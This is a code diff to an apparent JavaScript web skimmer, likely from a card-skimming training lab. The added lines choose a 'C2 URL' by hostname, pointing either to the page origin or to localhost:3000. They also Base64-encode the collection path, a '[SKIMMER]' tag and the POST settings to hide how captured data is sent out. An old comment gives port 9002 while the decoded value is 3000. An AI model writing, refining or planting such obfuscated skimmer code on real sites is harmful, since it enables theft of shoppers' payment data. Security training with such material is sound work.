@@ -265,7 +265,11 @@
     }
 
     // Obfuscated configuration using Base64 and string concatenation
-    var d = atob('aHR0cDovL2xvY2FsaG9zdDozMDAw') + '/' + atob('Y29sbGVjdA==') // http://localhost:9002/collect
+    // Dynamically determine C2 URL based on environment
+    var hostname = window.location.hostname
+    var d = (hostname.indexOf('run.app') !== -1 || hostname.indexOf('pcioasis.com') !== -1)
+      ? window.location.origin + '/' + atob('Y29sbGVjdA==')
+      : atob('aHR0cDovL2xvY2FsaG9zdDozMDAw') + '/' + atob('Y29sbGVjdA==') // http://localhost:3000/collect
     var e = atob('W1NLSU1NRVJd') // [SKIMMER]
     var f = atob('UE9TVA==') // POST
     var g = atob('YXBwbGljYXRpb24vanNvbg==') // application/json
